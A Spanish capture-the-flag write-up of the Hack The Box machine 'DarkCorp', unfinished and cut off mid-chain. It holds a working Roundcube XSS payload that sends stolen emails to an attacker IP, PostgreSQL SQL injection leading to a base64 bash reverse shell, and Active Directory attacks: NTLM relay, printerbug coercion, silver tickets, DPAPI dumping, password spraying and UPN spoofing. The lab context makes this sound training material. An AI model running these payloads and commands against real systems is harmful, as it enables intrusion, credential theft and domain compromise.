El dia de hoy vamos a pwnear una maquina de **HTB** llamada `DarkCorp` de dificultad insane donde utilizaremos las siguientes tecnicas:

- CVE-2024-42009
- Stored XSS
- SQLi -> RCE (postgress)
- acaba esto

Empezamos enviando una traza ICMP a la máquina víctima, para asegurarnos de que hay comunicación con esta.

```bash
ping -c 1 10.129.232.7
```

![](<img/Pasted image 20260503195540.png>)

Una vez confirmamos que el paquete llega, podemos observar que en este caso el ttl es 127. En este caso podemos confirmar que es windows porque por default este tiene 128 de ttl, pero como el paquete pasa por el servidor vpn. Vamos a tirar un escaneo rápido sobre los puertos.

```bash
sudo nmap -sS -Pn -n -vvv --min-rate 5000 10.129.232.7 -p-
```

![](<img/Pasted image 20260503195852.png>)

En este caso tiene el puerto 22 y 80 abiertos, vamos a ver que servicios y versiones estan corriendo en dichos puertos.

```bash
sudo nmap -sCV -p22,80 10.129.232.7
```


![](<img/Pasted image 20260503201104.png>)

Perfecto nginx, (web o reverse proxy), vamos a entrar.

![](<img/Pasted image 20260503201250.png>)

Que raro nos ha llevado directamente a "drip.htb", vamos a hacer un curl para ver que es lo que pasa

```bash
curl http://10.129.232.7
```

![](<img/Pasted image 20260503201304.png>)

Vale en este caso tiene una etiqueta meta que redirecciona directamente al vhost, por lo que vamos a añadir ese domino al `/etc/hosts`

```bash
sudo bash -c "echo -e '\n10.129.232.7\tdrip.htb'" # tengo zsh por eso pongo bash -c
```

![](<img/Pasted image 20260503201423.png>)

Perfecto, vamos a entrar de nuevo

![](<img/Pasted image 20260503201436.png>)

Este caso carga, es una landing page, mientras vamos leyendo y viendo la landing page, vamos a tirar en segundo plano gobuster para buscar subdirs o archivos "escondidos", ya que robots.txt no pone nada.

```bash
gobuster dir -u https://drip.htb -w /usr/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,xml,zip,html,png,jpeg,css,xslx,docx,txt,bak
```

![](<img/Pasted image 20260503212008.png>)

No ha encontrado nada, si ponemos el mause encima del boton "Sign-in" Vemos que nos redirige a otro subdominio `mail.drip.htb`

![](<img/Pasted image 20260503202944.png>)

Como vemos que pueden haber subdominios dentro del vhost vamos a usar ffuf para buscar otros vhosts cambiando la cabecera `Host` de `HTTP` (como en `Domain Fronting`).

```bash
ffuf -u https://10.129.232.7 -H "Host: FUZZ.drip.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-topmillion-200000.txt -ac
```

![](<img/Pasted image 20260503202632.png>)

En este caso solo nos ha encontrado el que teniamos (mail) asi que vamos a añadirlo a `/etc/hosts`


![](<img/Pasted image 20260503202754.png>)

Vamos a entrar

![](<img/Pasted image 20260503203705.png>)

Al entrar a mail.drip.htb nos pide crearnos una cuenta, vamos a probar hbr si funciona.

![](<img/Pasted image 20260503203718.png>)

Perfecto, vamos a loguearnos.

![](<img/Pasted image 20260503203731.png>)

Perfecto parece que estamos en un cliente mail web, nos ha llegado un correo de bienvenida, de momento no nos sirve de mucho.

![](<img/Pasted image 20260503203749.png>)
Si volvemos a la página inicial y leemos el código, encontramos algo interesante en el formulario, vamos a revisarlo con burpsuite.
![](<img/Pasted image 20260503203947.png>)

Lo enviamos e interceptamos la petición.

![](<img/Pasted image 20260503204004.png>)

Vale... Encontramos que tiene en un input hidden en el form, diciendo el correo hacia donde se va a enviar, vamos a poner nuestro correo para ver si nos llega

![](<img/Pasted image 20260503204738.png>)

Perfecto si nos llega

![](<img/Pasted image 20260503205005.png>)

Lo malo es que hemos puesto en el correo etiquetas html pero las imprime en texto plano.

![](<img/Pasted image 20261011030611.png>)

Analizando mas atentamente la petición vemos que hay un parametro llamado `content` y este tiene el valor de text, vamos a cambiarlo a html para ver si cambia

![](<img/Pasted image 20260503205205.png>)

Perfecto funciona

![](<img/Pasted image 20260503205237.png>)
Vamos a intentar un simple xss.
![](<img/Pasted image 20260503210908.png>)

Este no se interprete el codigo javascript.

![](<img/Pasted image 20260503210938.png>)
Bueno, vamos a revisar la versión.

![](<img/Pasted image 20260503204118.png>)

En este caso tenemos la versión 1.6.7 de RoundCube WebMail, por lo que buscando CVEs encontramos el siguiente:

https://nvd.nist.gov/vuln/detail/CVE-2024-42009

En este caso este CVE, tiene un `Improper Input Validation`, este viene de la manera en la que intenta sanitizar las entradas de texto. Las hace con la siguiente reggex

```bash
/\s?bgcolor=["\']*[a-z0-9#]+["\']*/i
```

La cosa es que podemos jugar con esa reggex para que ella craftee el script malicioso por nosotros haciendo que un codigo como este

```html
<body title="bgcolor=foo" name="bar onload=alert(origin)">
```

Al pasarlo por la regex se convierta en esto

```html
<body title=" name="bar onload=alert(origin)">
```

Si lo probamos

![](<img/Pasted image 20260503211148.png>)

Llega, vamos a abrir el correo

![](<img/Pasted image 20260503211209.png>)

Perfecto, en este caso funciona (podriamos haber probado el exploit enviandonos un correo a nosotros mismos :P)

![](<img/Pasted image 20260503211251.png>)

Ahora vamos a hacer un script (gracias gemini) haciendo que lea el correo con javascript (encodeado en base64) haciendo que podamos leer los correos

```javascript
for (let i = 1; i <= 100; i++) {
	fetch("http://mail.drip.htb/?_task=mail&_caps=pdf=1,flash=0,tiff=0,webp=1,pgpmime=0&_uid=" + i + "&_mbox=INBOX&_framed=1&_action=preview", {
		mode: 'no-cors'
	}).then((response) => response.text()).then((text) => {
		fetch("http://192.168.132.128:8000", {
			mode: 'no-cors',
			method: "POST",
			body: text
		})
	});
}
```

![](<img/Pasted image 20260503214848.png>)

haciendo que el payload quede de la siguiente manera

```html
<body title="bgcolor=foo" name="bar onload=eval(atob(<script encodeado en base64>))">
```

Ahora debemos crear el "backend" o "endpoint" que se encargue de recibir las peticiones POST y hacerlas legibles (nada fancy) para ello utilizaremos python

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import re
import IPython
from pwn import log

class S(BaseHTTPRequestHandler):
	def log_message(self, format, *args):
		pass
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()
	def do_GET(self):
		self._set_headers()
	def do_HEAD(self):
		self._set_headers()
	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		post_data = self.rfile.read(content_length)
		self._set_headers()
		#print(post_data.decode())
		try:
			username_pattern = r'"mailbox":"INBOX","username":"(.*)","permaurl"'
			username = re.search(username_pattern, post_data.decode())[1]
			from_pattern = r'<span>From <span class="adr"><a href="mailto:(.*)" class="rcmContactAddress"'
			from_address = re.search(from_pattern, post_data.decode())[1]
			message_pattern = r'<div id="messagebody"><div class="message-part" id="message-part1"><div class="pre">(.*)<br>'
			message_body = re.search(message_pattern, post_data.decode(), re.DOTALL)[1]
			log.info(f"From: {from_address}")
			log.info(f"To: {username}")
			log.info(f"Message: {message_body}")
		except Exception as e:
			#print(e)
			pass

def run(server_class=HTTPServer, handler_class=S, port=8000):
		server_address = ('', port)
		httpd = server_class(server_address, handler_class)
		print(f'Starting httpd on {port}...')
		httpd.serve_forever()
if __name__ == "__main__":
	from sys import argv
	if len(argv) == 2:
		run(port=int(argv[1]))
	else:
		run()
```

Perfecto, ahora despues de probar diferentes correos, en el correo de bcase@drip.htb le ha llegado uno de ebelford donde le habla sobre un panel de informacion/analiticas y que tiene que cambiar la passwd.

![](<img/Pasted image 20260503221841.png>)

En este caso añadimos ese subdominio dentro de `/etc/hosts`

![](<img/Pasted image 20260503222057.png>)

accedemos

![](<img/Pasted image 20260503222158.png>)

entramos en el login y le damos a que hemos olvidado la contraseña, ponemos el correo

![](<img/Pasted image 20260503222327.png>)

lo enviamos

![](<img/Pasted image 20260503222336.png>)

Perfecto lo recibimos, abrimos el link

![](<img/Pasted image 20260503222426.png>)

ponemos la passwd que queremos

![](<img/Pasted image 20260503222446.png>)

y ya estamos dentro yay

![](<img/Pasted image 20260503222617.png>)

Viendo el panel lateral aparte del panel inical encontramos uno que pone "Analytics" en este caso solo al entrar ya pone unerror de sql

![](<img/Pasted image 20260503222703.png>)

si ponemos un payload basico de sqli

```sql
isma' OR 1=1-- -
```

![](<img/Pasted image 20260503223004.png>)

En este caso para de mostrarnos error

![](<img/Pasted image 20260503223015.png>)

Asi que tenemos sqli, vamos a verificar la versión

```SQL
'isma' ; SELECT version; --'
```

![](<img/Pasted image 20260503223431.png>)

la version 15, vale, vamos a verificar si somos superusuario en la base de datos PostgreSQL

```SQL
'isma' ; SELECT current_setting('is_superuser'); --'
```

![](<img/Pasted image 20260503224328.png>)

En este caso lo somos, vamos a por el `RCE` asi que para ello debemos de cargar la config de postgresql.

```SQL
'isma' ; lo_import('/etc/postgresql/15/main/postgresql.conf'); --'
```

![](<img/Pasted image 20260503225005.png>)

una vez cargada, nos devolvera un id, vamos a poner este y vamos a hacer que imprima en pantalla la config. 

```SQL
'isma' ; SELECT encode(lo_get({ID_DEVUELTO}), 'escape'); --'
```

![](<img/Pasted image 20260503225035.png>)

Perfecto, copiamos la config y la modificamos en nuestra máquina, en este caso activamos y modificamos los siguientes parametros

```diff
#postgress.conf

-archive_mode=on
+archive_mode = always   
-archive_command = ''
+archive_command = 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDEvNDQzIDA+JjE=" | base64 --decode | bash'
-#archive_timeout=0
+archive_timeout = 1 
```

![](<img/Pasted image 20260503225705.png>)

En este caso lo que esta encodeado en base64 es un one liner de una reverse shell básica de bash (asumiendo que es linux y que tiene bash, sinó tocará usar powershell).

```bash
bash -i >& /dev/tcp/10.10.14.141/443 0>&1 #sin encodear
```

![](<img/Pasted image 20260503225503.png>)

Ahora encodeamos toda la config en base64

![](<img/Pasted image 20260503230305.png>)

y creamos un nuevo proceso (con el id que queramos) subiendo la config módificada.

```SQL
'isma' ; SELECT lo_from_bytea(99999, decode('{encoded_config}', 'base64')); --'
```

![](<img/Pasted image 20260503230407.png>)

La exportamos al archivo de config

```SQL
'isma' ; SELECT lo_export(99999, '/etc/postgresql/15/main/postgresql.conf'); --'
```

![](<img/Pasted image 20260503230551.png>)

Preparamos netcat para recibir la reverse shell

```bash
nc -nvlp 443
```

![](<img/Pasted image 20260503230656.png>)

Y finamente recargamos la config de postgreSQL

```SQL
'isma'; SELECT pg_reload_conf(); --'
```

![](<img/Pasted image 20260503230731.png>)

Si volvemos a netcat ya tenemos reverse shell

![](<img/Pasted image 20260503230752.png>)

Hacemos tratamiento de la TTY

```bash
script /dev/null -c bash

^Z # conunto de teclas

stty size # para saber el tamaño de la terminal

stty raw -echo; fg

reset
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 70 columns 180 # (el tamaño que stty nos ha dado)
```

![](<img/Pasted image 20260503231718.png>)

Imprimimos por pantalla el archivo /etc/hosts para ver si existen otros subdominios o hosts.

```bash
cat /etc/hosts
```

![](<img/Pasted image 20260503231849.png>)

En este caso nos chiva que en otro rango de red hay un DC por lo que esta maquina tiene mas de una interfaz, vamos a listar el /etc/passwd para listar usuarios

```bash
cat /etc/passwd
```

![](<img/Pasted image 20260503231912.png>)

en este caso solo esta ebelford (el mismo qu envio el correo al otro), vamos a home listamos si hay algo interesante y nada no tenemos permisos

![](<img/Pasted image 20260503232046.png>)

Vamos a setearnos como Home /var/lib/postgresql porque lo pone en /etc/passwd

```bash
HOME="/var/lib/postagresql"
cd
```

![](<img/Pasted image 20260503232138.png>)

Perfecto ya tenemos user para ssh y poder traer binarios o en general tener una conexion estable y que podamos volver a conectarnos si por alguna razon se cae la conexion sin tener que volver a subir config y recargar, ahora vamos a revisar la base de datos para ello entramos en

```bash
postgress
```

listamos las bases de datos

```postgresql
\list
```

![](<img/Pasted image 20260503232522.png>)

nos conectamos a la de drip mail

```postgresql
\connect dripmail
```

![](<img/Pasted image 20260503232532.png>)

Vamos a imprimir la tabla de admins

```postgresql
select * from "Admins"
```

![](<img/Pasted image 20260503232543.png>)

metemos el hash en un txt

```bash
echo "b65cb932ad941c2de600ff3c5c0c9a56" > hash-bcase.txt
```

![](<img/Pasted image 20260503232638.png>)

y lo rompemos con hashcat

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```

![](<img/Pasted image 20260503234102.png>)

En este caso ha encontrado la contraseña que habiamos cambiado, vamos a revisar users

```postgresql
slect * from Users;
```

![](<img/Pasted image 20260503234131.png>)

guardamos los hashes en un txt y lo rompemos con hashcat

```bash
echo -e "d9b9ecbf29db8054b21f303072b37c4e\n1eace53df87b9a15a37fdc11da2d298d\n0cebd84e066fd988e89083879e88c5f9" > hashes.txt

hashcat hashes.txt /usr/share/wordlists/rockyou.txt
```

![](<img/Pasted image 20260503235111.png>)

en este caso hashcat pone exausted asi que no ha conseguido nada, volvemos a el home de postgress. En este caso teniendo en cuenta que somos admin de postgresql vamos a buscar los logs para ver si encontramos la contraseña lekeada de ebelford

```bash
cd /var/log/postgress
zcat *.gz | grep 'ebelford'
```

![](<img/Pasted image 20260504080938.png>)

Perfecto tenemos hash, vamos a romperlo

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt 
```

![](<img/Pasted image 20260504093139.png>)
perf tenemos creds, si las probamos por ssh funcionan, vamos a ver si hay algo mas como user `postgress` antes de pasar a ebelford.
![](<img/Pasted image 20260504080844.png>)

perfecto un directorio de backups, vamos a entrar

```bash
cd backups
```

![](<img/Pasted image 20260504080859.png>)

directorio solo de postgress vamos a entrar

```bash
cd postgres && ls
```

![](<img/Pasted image 20260504095143.png>)

perfecto un archivo encriptado con contraseña

```bash
file dev-dripmail.old.sqwl.gpg
```

![](<img/Pasted image 20260504095313.png>)

bueno vamos a bsucar si por var/www tienen algo

```bash
cd /var/www/ && ls
```

![](<img/Pasted image 20260504095354.png>)

primero como estamos como postgresql vamos a buscar algun archivo de credenciales en `/var`.

```bash
find . -type f -name ".*env*" 2>/dev/null
cat www/html/dashboard/.env
```

![](<img/Pasted image 20260504095556.png>)

perfecto tenemos una credencial, vamos a ver si de nuevo como pasa con ebelford (el user) se repiten creds, las probamos

```bash
gpg --batch -d dev-dripmail.old.sql.gpg
```

![](<img/Pasted image 20260504111056.png>)

Perfecto, se ha abierto

![](<img/Pasted image 20260504111339.png>)

vamos a buscar creds de admins

![](<img/Pasted image 20260504113117.png>)

mas hashes vamos a intentar romperlos

```bash
hashcat -m 0 hashes2.txt --show
```

![](<img/Pasted image 20260504113410.png>)

En este caso encontramos de nuevo la cred de ebelford que ya teniamos pero ahora nos da la de victor.r, vamos a buscar si hay algo mas a hacer aqui, antes de probar las creds de ebelford y victor contra el dominio

```bash
find / -type f -writable 2>/dev/null
find / -type f -perm 4000 2>/dev/null
```

![](<img/Pasted image 20260504100736.png>)

nada, vamos a conectarnos por ssh para trabajar mejor

```bash
ssh ebelford@10.127.232.7
```

![](<img/Pasted image 20260504093723.png>)

vamos a setear el HOME durante esta sesion en un directorio temporal para trabajar mejor

```bash
HOME=$(mktemp -d)
echo $HOME
cd
```

![](<img/Pasted image 20260504100717.png>)

Nos descargamos chisel

```bash
wget "https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz"
```

En este caso dice que no puede resolver github.com, por lo que asumimos que no tiene acceso a internet.

![](<img/Pasted image 20260504101633.png>)

Así que en este caso, vamos a descargarlo en nuestra máquina atacante y de ahi pasarlo mediante `HTTP` a la máquina objetivo. Pero primero lo tenemos que descomprimir y hacer el nombre más corto para poder trabajar mejor.

```bash
wget "https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz"
gzip -d chisel*.gz && rm chisel*.gz && mv chisel* chisel && chmod +x chisel
```

![](<img/Pasted image 20260504102305.png>)

Ahora hacemos lo mismo con nmap, aunque en este caso no podemos hacer un escaneo SYN ya que este necesitaría ROOT. Pero a diferencia de hacer nuestro escaner con bash, con nmap podemos ver los servicios que corren y versiones.

```bash
wget "https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap"
chmod +x nmap
```

![](<img/Pasted image 20260504102414.png>)

Una vez ya tenemos todo hecho, desde la máquina objetivo descargamos los binarios.

```bash
wget http://10.10.14.141:8081/nmap
wget http://10.10.14.141:8081/chisel
ls
```

![](<img/Pasted image 20260504102551.png>)
Para poder hacer pivoting, primero debemos ejecutar el chisel como servidor para que se conecte la maquina objetivo.

```bash
sudo ./chisel --reverse --port # En nuestra máquina atacante

# En la máquina objetivo
./chisel client 10.10.14.141:443 R:socks &
```

![](<img/Pasted image 20260504103041.png>)
En este caso podemos ver como se ha realizado la conexión con éxito, la cosa es que en este caso he usado el puerto 443 (opsex). Una vez tenemos esto, debemos de configurar proxychains para poder usar chisel como proxy, para eso podemos simplemente usar este one liner (pongo bash -c porque aveces zsh quiere discutir).

```bash
sudo bash -c "echo -e'\nsocks5\t127.0.0.1 1080 >> /etc/proxychains4.conf"

cat /etc/proxychains4.conf
```

![](<img/Pasted image 20260504103216.png>)
Perfecto, una vez lo tenemos configurado, podemos hacer un escaneo de ips, en este caso me apetecia hacerlo con bash, ya que no debería haber ningún firewall, pero también podriamos haber utilizado el binario de nmap.

```bash
set +m; for i in {1..254}; do (ping -c 1 -W1 172.16.20.$i &>/dev/null && echo "[+] - La ip 172.16.20.$i esta activa.) & done; wait
```

![](<img/Pasted image 20260504104607.png>)
En este caso encontramos que tenemos 3 hosts que han respondido sobre nuestras trazas ICMP, como hay un DC, asumo que son máquinas parte del Directorio Activo, asi que vamos a usar `nxc` para identificarlos.

```bash
proxychains -q nxc smb 172.16.20.1
```

![](<img/Pasted image 20260504104657.png>)

Perfecto, como vimos antes la `.1` es el DC.

```bash
proxychains nxc smb 172.16.20.2
```

![](<img/Pasted image 20260504104902.png>)
En la `.2` tenemos un servidor que se llama `WEB-01`. La `.3` no hace falta ya que es la otra interfaz de la máquina que estamos usando de puente. Así que vamos a hacer un escaneo de puertos con el binario que hemos traido de nmap.

```bash
nmap -p- -Pn -n -vvv --min-rate 172.16.20.2
```

![](<img/Pasted image 20260504105250.png>)
Vale, puerto 80 y 445 abierto. Vamos a ver el DC.

```bash
nmap -p- -Pn -n -vvv --min-rate 5000 172.16.20.1
```

![](<img/Pasted image 20260504105423.png>)
En este caso tiene también ssh. Bueno empezamos con el servidor `WEB-01`.Entramos en el puerto 80 (con foxyproxy apuntando al servidor chisel) y tiene la web default de windows server, nada relevante porque no hay login.

![](<img/Pasted image 20260504105940.png>)

La 172.16.20.1 es el drip mail ya estabamos (lo de antes era un reverse proxy??).

![](<img/Pasted image 20260504110028.png>)
Nos redirige directamente a el dominio como antes.
![](<img/Pasted image 20260504110040.png>)

En la `.2` en el puerto 5000 tiene login.

![](<img/Pasted image 20260504110105.png>)

Bueno, vamos a probar las creds que tenemos en el smb.

```bash
proxychains -q nxc smb 172.16.20.2 -u ebelford -p ThePlague@1780
```

![](<img/Pasted image 20260504190627.png>)
El usuario Ebelford al parecer no existe en el AD, así que vamos a probar con el resto de creds que tenemos, empezando por `victor.r`.

```bash
proxychains -q netexec smb 172.16.20.1 -u victor.r -p 'victor1gustavo@#' --shares
```

![](<img/Pasted image 20260504190508.png>)
Perfecto, tenemos un user, vamos enumerar la configuración del AD para ver hacia donde dirigir nuestra atención
```cmd
proxychains netexec ldap 172.16.20.1 -u victor.r -p victor1gustavo@# -M maq -M adcs
```

![](<img/Pasted image 20260504190727.png>)

Como no podemos registrar máquinas para abusar de `RBCD` (MAQ es 0), pero expone los servicios web de `AD CS` vamos a dirigir nuestra atención a esto. Pero antes vamos a recolectar todos los datos del dominio (grupos, relacions de confianza, ACLs, etc.)

```bash
proxychains bloodhound-python -d darkcorp.htb -u victor.r -p 'victor1gustavo@#' -c all -ns 172.16.20.1 --dns-tcp --zip -gc dc-01.darkcorp.htb
```

![](<img/Pasted image 20260504191851.png>)
En este caso no tenemos ningúna via directa como `victor.r` para admin, asi que vamos a seguir búscando otros vectores.
![](<img/Pasted image 20260504195144.png>)
En este caso en la el puerto `5000` de `WEB-01` vamos a probar las creds de `victor.r`-
![](<img/Pasted image 20260504195910.png>)
Perfecto, estamos dentro. En este caso tenemos como un panel de administración, en este caso, nos muestra que tanto `WEB-02`, `WEB-03` como `DB-01` y `DB-02` no funcionan o están caidos. Si por ejemplo hubiera alguna tarea CRON para algúna carpeta `SMB` hacia alguno de esos hosts, con un simple responder podríamos pillar hash. Hbr para que es esta info.
![](<img/Pasted image 20260504200456.png>)
Vale... En este caso tenemos una herramienta que nos permite comprobar el estatus de los hosts, en este caso sabemos que el puerto `8080` en `WEB-01` no esta abierto, así que vamos a hacer port forwarding, trayendonos nuestro puerto `8000` para que se muestre en el puerto `8080` de `WEB-01`.

```bash
./chisel client 10.10.14.141:4443 8080:0.0.0.0:8000 R:socks &
```

![](<img/Pasted image 20260504205154.png>)
Perfecto, ya lo tenemos montado. Vamos a usar ntlm relay por si lo usa, en el caso de que no lo use auth por NTLM por http, simplemente podremos ver la petición.

```bash
sudo proxychains -q ntlmrelayx.py -t ldap://172.16.20.1 --http-port 8000
```

![](<img/Pasted image 20260504204948.png>)
Enviamos la petición desde la web.
![](<img/Pasted image 20260504205030.png>)
Perfecto, tenemos NTLM de la cuenta `SVC_ACC` :P. Se autentica contra el dominio, asi que vamos a intentar autenticarnos contra `AD CS` para solicitar un certificado `pfx`.

```bash
sudo proxychains -q ntlmrelayx.py -t https://dc01.darkcorp.htb/certsrv/certfnsh.asp --adcs --http-port 8000
```

![](<img/Pasted image 20260504205110.png>)
Vale en este caso no nos deja, si revisamos bloodhound encontramos que la cuenta `SVC_ACC` es parte del grupo `DNSADMINS`.
![](<img/Pasted image 20261012160852.png>)

Por lo que en este caso vamos a crear un resgistro DNS, esto nos permitirá forzar ciertas conexiones contra nuestra máquina pero que las máquinas victimas piensen que se autentican contra el dc. En este caso ponemos la ip de núestra máquina atacante ya que solo nos interesa que `WEB-01` tenga acceso a esta.

```bash
sudo proxychains -q ntlmrelayx.py -t ldaps://172.16.20.1 --http-port 8000 --add-dns-record 'dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.141 --no-dump --no-da --no-validate-privs
```

![](<img/Pasted image 20260504210130.png>)
Perfecto, si hacemos un `nslookup` (un ping tmb valdría) desde `WEB-01` encontramos que el registro DNS esta bien hecho.

```bash
nslookup dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.darkcorp.htb
```

![](<img/Pasted image 20260504210221.png>)
Una vez tenemos esto, ponemos en escucha a `kbrelayx` para que cuando se autentique contra nosotros, podamos perdir un ceriticado `pfx`.

```bash
sudo proxychains -q ./krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB-01$'
```

![](<img/Pasted image 20260504215542.png>)
En este caso lo que hacemos (aunque en la captura tenemos spoiler), es el hecho de que nos aprovecharemos de el registro DNS que hemos creado para forzar a la máquina `WEB-01` autenticarse contra nuestro equipo mediante `MS-RPRN` aunque también podríamos haber usado `MS-EFSR` si printerbug hubiera sido bloqueado. Lo que hacemos es decirle a `WEB-01` que le indique a nuestra máquna una notificación de cambio de estado, lo divertido es que en vez de hacerlo con el usuario que ya tenemos creds `victor.r`, este lo hace con la cuenta del equipo del dominio, por lo que en este caso cuando se autentica contra `https://dc-01.darkcorp.htb/certsrv/certfnsh.asp` conseguimos el certificado `pfx` for free :P

```bash
proxychains -q uv run --script ./printerbug.py 'darkcorp/victor.r':'victor1gustavo@#'@WEB-01.darkcorp.htb dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

![](<img/Pasted image 20260504215553.png>)
En este caso por mucho que nos diga que puede ser que no haya funcionado, sabemos que lo ha hecho, por lo que vamos a listar el directorio actual.

```bash
ls | grep ".pfx"
```

![](<img/Pasted image 20260504215620.png>)

Como podemos ver, tenemos el certificado de la cuenta del equipo del dominio de `WEB-01.pfx`, por lo que ahora con certipy vamos a pedir un `TGT` a nombre de la cuenta del equipo `WEB-01`.

```bash
sudo proxychains -q certipy auth -pfx 'WEB-01.pfx' -domain darkcorp.htb -dc-ip 172.16.20.1
```

![](<img/Pasted image 20260504215754.png>)
Una vez hemos conseguido el hash NT de la máquina con `certipy`, ahora vamos a conseguir el `DOMAIN SID`, para ello utilizamos el hash que tenemos.

```bash
proxychains -q lookupsid.py -hashes :8f33c7fc7ff515c1f358e488fbb8b675 'darkcorp.htb/WEB-01$@DC-01.darkcorp.htb'
```

![](<img/Pasted image 20260504220022.png>)
Una vez lo tenemos, ya podemos pedir un `Silver Ticket` para el Admin local de `WEB-01`

```bash
ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain darkcorp.htb -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -spn cifs/web-01.darkcorp.htb Administrator
```

![](<img/Pasted image 20260504220104.png>)
Una vez tenemos el archivo `.ccache` lo utilizamos contra `web-01`, en este caso utilizaremos `netexec` ya que el `Silver Ticket` no nos sirve poder conectarnos por `WINRM` solo para SMB, por lo que primero revisamos si tenemos admin. Una vez pone `pwned` en `nxc` podemos dumpear la sam tanto con `--sam` o con `secretdmp.py`.

```bash
KRB5CCNAME=Administrator.ccache proxychains -q netexec smb web-01.darkcorp.htb -k --use-kcache

KRB5CCNAME=Administrator.ccache proxychains -q netexec smb web-01.darkcorp.htb -k --use-kcache --sam
```

![](<img/Pasted image 20260504220150.png>)
perfecto, una vez lo tenemos, podemos usar `winrm` para conectarnos a `WEB-01` como admin.

```bash
proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.2 -u administrator -H 88d84ec08dad123eb04a060a74053f21
```

![](<img/Pasted image 20260504220756.png>)
Una vez dentro podemos larpear de la flag de `user` .

```powershell
cd ..\Desktop
type user.txt
```

![](<img/Pasted image 20260504221013.png>)
Bueno vamos a búscar algo interesante.

```bash
tree /f .
```

![](<img/Pasted image 20260504221023.png>)
Un script de powershell llamado `cleanup.ps1` ... huele a tarea `CRON` (se que estamos en winwdos pero es mejor que decir `tarea automatizada` :P). Vamos a listar su contendio.

```powershell
type Documents\cleanup\cleanup.ps1
```

![](<img/Pasted image 20260504221302.png>)
En este caso simplemente revisa si el servicio `w3svc` (web IIS) esta corriendo y si no, lo ejecuta.

```powershell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, @{Name="User";Expression={$_.Principal.UserId}}, @{Name="Command";Expression={($_.Actions.Execute + " " + $_.Actions.Arguments).Trim()}} | Format-Table -AutoSize
```

![](<img/Pasted image 20260504221647.png>)
Pero si revisamos más info sobre la tarea, encontramos que lo ejecuta nuestro propio usuario. Eso quiere decir que la cred esta almacenada usando `DPAPI` asi que vamos a dumpearlo, en este caso podríamos modificar el script para dumpear `DPAPI` ya que con winrm no podemos, pero en este caso simplemente utilizaremos `netexec`.

```bash
KRB5CCNAME=Administrator.ccache proxychains -q netexec smb 172.16.20.2 -u administrator --use-kcache --dpapi
```

![](<img/Pasted image 20260504224147.png>)
Perfecto, vamos a probar estas creds almacenadas, las probamos.

```bash
proxychains -q netexec smb 172.16.20.2 -u administrator -p But_Lying_Aid9! --local-auth
```

![](<img/Pasted image 20260504224237.png>)
En este caso que funcionan, dumpeamos la `DPAPI` y ahora como tenemos la passwd en texto plano y `--local-auth` nos da una nueva credencial. Esto ocurre porque al final con el silver ticket tenemos `privilegios` sobre las `Master Keys` almacenadas en el perfil local del usuario, por lo cual cuando lo volvemos a hacer con las creds, nos devuelve la cred `Pack_Beneath_Solid9!`. Una vez tenemos esto, vamos a listar todos los usuarios del dominio, para probar la nueva cred.

```cmd
proxychains -q netexec smb 172.16.20.1 -u victor.r -p victor1gustavo@# --users
```
![](<img/Pasted image 20260504224531.png>)
Vale una vez tenemos la lista, usamos awk para filtrar por la columna 5 y quitamos cualquier línea que comience con \[ * ].

```cmd
proxychains -q netexec smb 172.16.20.1 -u victor.r -p victor1gustavo@# --users | awk '{print $5}' | grep -v '[\[-]' > users.txt
```
![](<img/Pasted image 20260504224742.png>)
Una vez hemos creado este diccionario, vamos a hacer passwd spraying.

```bash
proxychains -q netexec smb 172.16.20.1 -u users.txt -p 'Pack_Beneath_Solid9!' --continue-on-success
```

![](<img/Pasted image 20260504224708.png>)
En este caso tenemos login sobre el usuario `john.w` si revisamos `bloodhound` encontramos que el usuario `john.w` tiene generic write sobre el usuario `angela.w`. Esto quiere decir que tenemos varias opciones, podríamos hacer shadow creds, upn spoofing o configurar el `SPN` para hacer kerberoasting.
![](<img/Pasted image 20260504224821.png>)
![](<img/Pasted image 20260504225219.png>)
la cosa es que adicionalmente existe otro usuario llamado `angela.w.adm` el cual es parte del grupo de `LINUX_ADMINS`, por lo cual el camino claro es `UPN SPOOFING`. Pero antes de hacer este vamos a utilizar `certipy shadow auto` para pillar el hash para después del `UPN SPOOFING` poder perdir TGT pero autenticarnos como `angela.w`.

```bash
proxychains -q certipy shadow auto -username john.w -p Pack_Beneath_Solid9! -account angela.w -target dc-01.darkcorp.htb
```
![](<img/Pasted image 20260504224926.png>)
Una vez lo tenemos podemos verificar que funcionan.

```bash
proxychains -q netexec smb 172.16.20.1 -u angela.w -H 957246c8137069bca672dc6aa0af7c7a
```

![](<img/Pasted image 20260504224943.png>)
Antes de nada, verificamos si el upn esta vacio o si tiene algo.

```bash
proxychains -q python3 /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w | grep userPrincipalName
```
![](<img/Pasted image 20260504225850.png>)
En este caso el `UPN Spoofing` hace que pongamos como un alias a el usuario. En este caso le decimos que su alias sea `angela.w.adm`.

```bash
proxychains -q /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' set object angela.w userPrincipalName -v angela.w.adm
```
